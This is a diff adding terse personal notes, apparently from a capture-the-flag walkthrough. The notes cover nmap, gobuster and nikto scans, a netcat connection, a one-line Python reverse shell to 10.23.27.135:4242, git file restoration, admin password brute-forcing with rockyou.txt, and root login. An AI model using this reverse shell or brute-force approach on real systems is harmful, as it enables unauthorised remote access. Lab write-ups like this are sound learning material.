@@ -1,0 +1,41 @@
+export IP=<IP>
+
+nmap scan
+
+nmap $IP -v -oN nmap.log -A
+
+gobuster scan
+gobuster dir -u http://$IP -w /usr/share... -t 100
+
+nikto scan
+nikto -h $IP
+
+
+
+
+==========
+more basic means netcat from google search
+
+open netcat listener
+cmd: sudo nc $IP 8000 -v
+
+-> simple test results that its running python shell - search for python reverse shell script
+
+```
+import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.23.27.135",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
+```
+
+
+-> /opt/ - folder contains dev folder - suspicious or may be more information
+-> /opt/dev/ - folder contains .git folder which might provide more info about the user - details in config file
+
+-> do git status -> restore the file -> can see we need to enter enpoints
+
+-> basic fuzzing says - admin is the endpoint and is asking for password
+
+-> same script => "adminPass.py" -> does the bruteforcing the password from rockyou.txt file
+
+-> login as root
+
+-> find the flag in root's home directory
+
